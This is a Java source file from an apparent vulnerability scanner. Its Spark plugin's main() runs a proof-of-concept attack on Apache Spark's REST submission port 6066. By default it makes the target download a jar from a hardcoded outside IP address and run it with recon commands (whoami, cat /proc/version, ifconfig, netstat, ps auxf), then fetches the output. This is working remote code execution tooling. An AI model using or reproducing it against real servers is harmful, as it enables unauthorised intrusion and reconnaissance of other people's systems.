package com.gbw.scanner.plugins.scripts.hadoop.spark;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
import com.gbw.scanner.sink.SinkQueue;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Options;

import java.util.ArrayList;
import java.util.List;

public class GBWScanSparkScript implements GBWScanScript {

    private GBWScanSparkConfig config;
    private GBWScanSparkRestScript restScript;

    public GBWScanSparkScript(GBWScanSparkConfig config){

        this.config =config;

        this.restScript = new GBWScanSparkRestScript(config);


    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        boolean res = false;

        res = restScript.scan(host,sinkQueue);

    }

    public GBWScanSparkRestScript getRestScript() {
        return restScript;
    }

    public static void main(String[] args) throws Exception{

        GBWScanSparkConfig config = new GBWScanSparkConfig();
        GBWScanSparkScript scanSparkScript = new GBWScanSparkScript(config);

        String sparkVersion ="2.4.5";
        String appName = "SparkPoc";
        String jarFile = "spark.jar";
        String jarUrl = "http://128.199.250.129:9998/spark.jar";
        String mainClass = "com.scan.spark.Spark";
        String cmdArgs = "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf";

        String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";

        Options opts = new Options();

        opts.addOption("version",true,"spark cliend version");
        opts.addOption("appName",true,"spark application name");
        opts.addOption("jarFile",true,"spark application jar file path");
        opts.addOption("jarUrl",true,"spark application jar url");
        opts.addOption("mainClass",true,"spark application jar main class name");
        opts.addOption("args",true,"spark application jar main args");
        opts.addOption("ua",true,"spark application client user-agent");

        opts.addOption("get",true,"get spark run result,args:<ip>:<port>:<submitID>");

        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanSparkScript,opts,6066);

        CommandLine cli = tool.getCliParser();

        List<String> dirs = new ArrayList<>();

        if(cli.hasOption("version")){
            sparkVersion = cli.getOptionValue("version");
        }
        if(cli.hasOption("appName")){
            appName = cli.getOptionValue("appName");
        }
        if(cli.hasOption("jarFile")){
            jarFile = cli.getOptionValue("jarFile");
        }

        if(cli.hasOption("jarUrl")){
            jarUrl = cli.getOptionValue("jarUrl");
        }
        if(cli.hasOption("mainClass")){
            mainClass = cli.getOptionValue("mainClass");
        }
        if(cli.hasOption("args")){
            cmdArgs = cli.getOptionValue("args");
        }
        if(cli.hasOption("ua")){
            userAgent = cli.getOptionValue("ua");
        }

        if(cli.hasOption("get")){

            String myargs = cli.getOptionValue("get");
            String[] splits = myargs.split(":");

            String host = splits[0];
            int port = Integer.parseInt(splits[1]);
            String subId = splits[2];

            System.out.println(scanSparkScript.getRestScript().getResult(host,port,subId));
            System.exit(0);
        }

        config.setSparkVersion(sparkVersion);
        config.setAppName(appName);
        config.setJarFile(jarFile);
        config.setJarUrl(jarUrl);
        config.setMainClass(mainClass);
        config.setArgs(cmdArgs);
        config.setUserAgent(userAgent);

        tool.start();

    }

}
